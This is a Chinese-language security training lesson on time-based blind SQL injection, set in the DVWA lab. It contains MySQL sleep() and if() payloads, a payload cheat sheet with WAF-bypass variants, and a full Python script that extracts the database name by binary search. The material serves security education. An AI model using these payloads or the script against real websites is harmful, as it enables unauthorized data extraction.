---
title: Day032：SQL 注入进阶 - 时间盲注
tags:
  - 网络安全
  - SQL注入
  - 时间盲注
categories:
  - 90天安全突击
stage: 攻坚
abbrlink: d032
date: 2026-02-23
updated: 2026-01-28
---

# Day032：SQL 注入进阶 - 时间盲注

## 基本信息

| 项目 | 内容 |
|------|------|
| **所属阶段** | 攻坚（第二阶段） |
| **所属周次** | Week 6：SQL 注入进阶 |
| **今日主题** | 时间盲注原理与自动化 |
| **预计时间** | 3 小时 |
| **难度等级** | 进阶 |

---

## 今日痛点场景

> **场景**：你发现一个注入点，但页面无论输入什么都返回完全相同的内容。布尔盲注失效了！
>
> **问题**：页面没有任何变化，怎么判断条件真假？
>
> **今天的任务**：学习时间盲注，用"响应时间"来判断条件。

---

## 今日目标

- [ ] 理解时间盲注的原理
- [ ] 掌握 `sleep()` 和 `if()` 的用法
- [ ] 手工完成时间盲注验证
- [ ] 编写 Python 自动化脚本

**闯关条件**：使用时间盲注判断数据库名长度。

---

## 实战任务（先动手！）

### 任务 1：验证时间盲注（15 分钟）

**环境**：DVWA - SQL Injection (Blind) - Low

**操作步骤**：

1. 输入以下 payload，记录响应时间：
```sql
1' and sleep(3)--
```

2. 如果响应延迟了约 3 秒，说明注入成功

**记录**：
```
正常请求响应时间：____秒
注入 sleep(3) 响应时间：____秒
```

---

### 任务 2：条件时间盲注（25 分钟）

**原理**：结合 `if()` 函数，只在条件为真时延迟

**Payload 模板**：
```sql
1' and if(条件, sleep(3), 0)--
```

**操作步骤**：

1. 测试条件为真：
```sql
1' and if(1=1, sleep(3), 0)--
```
应该延迟 3 秒

2. 测试条件为假：
```sql
1' and if(1=2, sleep(3), 0)--
```
应该立即返回

**记录**：
```
1=1 时响应时间：____秒
1=2 时响应时间：____秒
```

---

### 任务 3：判断数据库名长度（30 分钟）

**Payload**：
```sql
1' and if(length(database())=N, sleep(3), 0)--
```

**操作步骤**：

1. 测试 `length(database())=1`
2. 测试 `length(database())=2`
3. 继续...直到出现延迟

**记录**：
```
数据库名长度：____
验证 payload：________________
```

---

### 任务 4：Python 自动化脚本（60 分钟）

**创建 `time_blind_sqli.py`**：

```python
import requests
import time

# 目标配置
url = "http://YOUR_DVWA_IP/vulnerabilities/sqli_blind/"
cookies = {"PHPSESSID": "YOUR_SESSION_ID", "security": "low"}

def check_time(payload, threshold=2):
    """发送请求并判断是否延迟"""
    params = {"id": payload, "Submit": "Submit"}
    start = time.time()
    requests.get(url, params=params, cookies=cookies)
    elapsed = time.time() - start
    return elapsed > threshold

def get_database_length():
    """获取数据库名长度"""
    for length in range(1, 20):
        payload = f"1' and if(length(database())={length}, sleep(3), 0)-- "
        if check_time(payload):
            print(f"[+] 数据库名长度: {length}")
            return length
    return 0

def get_database_name(length):
    """获取数据库名"""
    db_name = ""
    for i in range(1, length + 1):
        # 使用二分法
        low, high = 32, 126
        while low < high:
            mid = (low + high) // 2
            payload = f"1' and if(ascii(substr(database(),{i},1))>{mid}, sleep(3), 0)-- "
            if check_time(payload):
                low = mid + 1
            else:
                high = mid
        db_name += chr(low)
        print(f"[+] 当前进度: {db_name}")
    return db_name

if __name__ == "__main__":
    print("[*] 开始时间盲注...")
    length = get_database_length()
    if length > 0:
        db_name = get_database_name(length)
        print(f"[+] 数据库名: {db_name}")
```

**使用方法**：
1. 修改 `url` 为你的 DVWA 地址
2. 修改 `cookies` 中的 PHPSESSID
3. 运行脚本

**记录**：
```
脚本获取的数据库名：________________
脚本运行时间：____分钟
```

---

## 今日闯关检查

| 检查项 | 分数 |
|--------|------|
| 理解时间盲注原理 | 15 分 |
| 成功验证 sleep 延迟 | 15 分 |
| 成功判断数据库名长度 | 20 分 |
| 完成 Python 脚本 | 30 分 |
| 脚本成功获取数据库名 | 20 分 |

**60 分及格，80 分优秀，100 分满分**

你的得分：____

---

## 底层补课

### 时间盲注原理

```
核心思想：通过响应时间判断条件真假

条件为真 → 执行 sleep → 响应延迟
条件为假 → 不执行 sleep → 立即返回

利用时间差异推断数据
```

### 核心函数

| 数据库 | 延时函数 | 示例 |
|--------|----------|------|
| MySQL | `sleep(N)` | `sleep(3)` 延迟 3 秒 |
| MySQL | `benchmark()` | `benchmark(10000000,md5('a'))` |
| PostgreSQL | `pg_sleep(N)` | `pg_sleep(3)` |
| MSSQL | `waitfor delay` | `waitfor delay '0:0:3'` |
| Oracle | `dbms_pipe.receive_message` | 复杂，不常用 |

### MySQL if() 函数

```sql
if(条件, 真时执行, 假时执行)

-- 示例
if(1=1, 'yes', 'no')  -- 返回 'yes'
if(1=2, 'yes', 'no')  -- 返回 'no'

-- 时间盲注
if(length(database())=4, sleep(3), 0)
```

### 布尔盲注 vs 时间盲注

| 对比项 | 布尔盲注 | 时间盲注 |
|--------|----------|----------|
| 判断依据 | 页面内容差异 | 响应时间差异 |
| 适用场景 | 页面有变化 | 页面完全无变化 |
| 速度 | 较快 | 较慢（需等待延迟） |
| 稳定性 | 高 | 受网络影响 |

### 时间盲注优化

**问题**：每次请求都要等 3 秒，太慢！

**优化方案**：

1. **减少延迟时间**：
   - 改用 `sleep(1)` 或 `sleep(0.5)`
   - 设置合适的阈值

2. **使用二分法**：
   - 减少请求次数
   - 每个字符只需约 7 次请求

3. **并发请求**（高级）：
   - 同时猜测多个位置
   - 注意不要把服务器打挂

---

## 避坑指南

| 坑点 | 症状 | 解决方案 |
|------|------|----------|
| 网络延迟干扰 | 误判 | 增加延迟时间，多次验证 |
| 连接超时 | 脚本报错 | 设置合适的 timeout |
| 服务器限速 | 请求被拦截 | 降低请求频率 |
| sleep 被禁用 | 无延迟 | 尝试 benchmark() |

---

## 知识卡片速查

### 时间盲注 Payload 模板

```sql
# MySQL 基础延迟
1' and sleep(3)--

# 条件延迟
1' and if(条件, sleep(3), 0)--

# 判断长度
1' and if(length(database())=4, sleep(3), 0)--

# 猜解字符
1' and if(ascii(substr(database(),1,1))=100, sleep(3), 0)--

# 使用 benchmark（sleep 被禁时）
1' and if(1=1, benchmark(10000000,md5('a')), 0)--
```

### Python 脚本要点

```python
# 计算响应时间
start = time.time()
response = requests.get(url, params=params)
elapsed = time.time() - start

# 判断延迟
if elapsed > threshold:
    # 条件为真
```

---

## 常见问题

**Q1：时间盲注比布尔盲注慢多少？**

A1：假设每次延迟 3 秒，获取一个 10 字符的数据库名：
- 布尔盲注：约 70 次请求，几秒完成
- 时间盲注：约 70 次请求 × 3 秒 = 3.5 分钟

**Q2：sleep() 被 WAF 拦截怎么办？**

A2：
1. 使用 `benchmark()` 替代
2. 使用笛卡尔积延迟：`(select count(*) from information_schema.columns a, information_schema.columns b)`

**Q3：怎么确定最佳延迟时间？**

A3：
1. 先测试正常响应时间
2. 延迟时间 = 正常响应时间 × 3 或更多
3. 阈值 = 正常响应时间 × 2

---

## 明日预告

**Day 033：SQL 注入进阶 - 报错注入**

明天你将：
- 学习报错注入的原理
- 掌握 `extractvalue()`、`updatexml()` 等函数
- 利用错误信息直接获取数据

---

## 学习记录

| 项目 | 内容 |
|------|------|
| 实际学习日期 | |
| 脚本完成情况 | |
| 获取的数据库名 | |
| 今日收获 | |

---

> **导师点评**：
>
> 今天你学会了"最慢但最可靠"的注入方式。
>
> 时间盲注虽然慢，但它能在"任何情况"下使用。只要能执行 SQL，就能用时间判断。
>
> 脚本写得怎么样？能跑通吗？
>
> 这是你第一次写渗透测试脚本。以后会越写越多。**脚本小子**不是贬义词——能自动化的事情，就别手工干。
>
> **记住：工具是手的延伸，脚本是脑的延伸。**

```bash
echo "Day 032 Complete! 时间盲注 + 自动化脚本！"
```
